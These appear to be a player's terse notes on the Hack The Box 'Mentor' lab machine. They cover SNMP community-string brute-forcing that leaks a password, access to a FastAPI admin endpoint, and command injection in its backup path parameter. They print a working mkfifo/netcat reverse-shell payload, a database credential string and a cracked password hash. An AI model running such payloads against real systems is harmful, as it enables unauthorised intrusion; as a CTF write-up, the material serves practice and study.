Hack the box - mentor

Initial nmap scan with first 1000 tcp ports
```bash
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
```
Targert OS version
ubuntu jammy 22.04

Nmap 65535 port scan
no open ports rather than inital 1000 tcp ports scan

Udp scan nmap 1000 ports
```bash
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: mentor
```

service-snmp

snmp-brute we find a valid community string "internal" and dump datas using snmpbulkwak tool
we got a password from a process the process runing a script named login.py with argument as password
"kj23sadkj123as0-d213"


Service- HTTP

# mentorqoutes.htb
backend server python -  Werkzeug/2.0.3 Python/3.6.9

# api.mentorquotes.htb
Framework - Fastapi
swagger ui - /docs
We can create a user /auth/login {username,email,password}
endpoints /admin/check {not yet implemented}
          /admin/backup {path}

we can login user james as password we get from snmpdump

RCE on admin/backup PATH parameter
payload
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```

postgresql://postgres:postgres@192.168.1.4/hello_fastapi_dev'

53f22d0dfa10dce7e29cd31f4f953fd8
53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani
public
/root/scripts/docker/API /API rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
